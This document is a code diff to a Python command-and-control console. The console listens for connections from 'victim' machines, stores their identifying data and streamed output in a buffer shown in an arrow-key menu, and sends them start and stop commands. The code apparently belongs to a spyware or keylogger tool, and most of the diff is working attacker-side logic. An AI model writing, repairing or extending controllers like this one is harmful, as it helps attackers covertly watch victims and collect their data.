@@ -86,7 +86,8 @@ class ControllerServer:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
                         self.info_victim = data_str
-                        print(self.info_victim)
+                        # print(self.info_victim)
+                        self.buffer += data_str
                         continue
 
                     if signal:
@@ -114,6 +115,8 @@ class ControllerServer:
         finally:
             sock.close()
             print("Socket closed. Bye.")
+
+controller = ControllerServer()
 
 class ConsoleMenu:
     def __init__(self):
@@ -151,26 +154,18 @@ class ConsoleMenu:
         padding = (menu_width - len(footer)) // 2
         print("┃" + " " * padding + footer + " " * padding + " ┃")
         print("┗" + "━" * menu_width + "┛")
+        print(controller.buffer)
     
     def handle_input(self):
         if keyboard.is_pressed('up'):
             self.current_selection = (self.current_selection - 1) % len(self.options)  
-            self.clear_screen()
-            self.draw_menu()
             return True
         elif keyboard.is_pressed('down'):
             self.current_selection = (self.current_selection + 1) % len(self.options)
-            self.clear_screen()
-            self.draw_menu()
             return True
         elif keyboard.is_pressed('enter'):
             self.execute_selection()
-            self.clear_screen()
-            self.draw_menu()
             return True
-        else:
-            self.clear_screen()
-            self.draw_menu()
         return False
     
     def execute_selection(self):
@@ -178,48 +173,34 @@ class ConsoleMenu:
         print(f"\nВыбранная опция: {self.options[option]}")
 
         if option == 0:
-            pass
-        if option == 1:  
+            controller.buffer = ""
+        if option == 1: 
             if self.options[1] == "Pause":
                 self.options[1] = f"{self.pause_continue["Continue"]}"
-                self.controller.send_command("stop")
+                controller.send_command("stop")
             else:
                 self.options[1] = f"{self.pause_continue["Pause"]}"
-                self.controller.send_command("start")
-        if option == 2:  
+                controller.send_command("start")
+        if option == 2: 
             self.running = False
     
-    def run(self, controller):
-        self.controller = controller
-        self.clear_screen()
-        self.draw_menu()
+    def run(self):
         while self.running:
+            self.clear_screen()
+            self.draw_menu() 
             time.sleep(0.1)
             self.handle_input()
         exit()
 
 
 def main():
-    controller = ControllerServer()
     listener_thread = threading.Thread(target=controller.listen_clients, daemon=True)
     listener_thread.start()
-    print("\033[32m" + banner + "\033[0m")
+
     controller.send_command("start")
 
     menu = ConsoleMenu()
-    menu.run(controller)
-
-    # while True:
-    #     command = input("Send cmd (start/stop/exit): ").strip().lower()
-    #     if command == "start":
-    #         controller.send_command(command)
-    #     elif command == "stop":
-    #         controller.send_command(command)
-    #     elif command == "exit":
-    #         print("Exiting...")
-    #         break
-    #     else:
-    #         print("Unknown command.")
+    menu.run()
 
 if __name__ == "__main__":
     main()
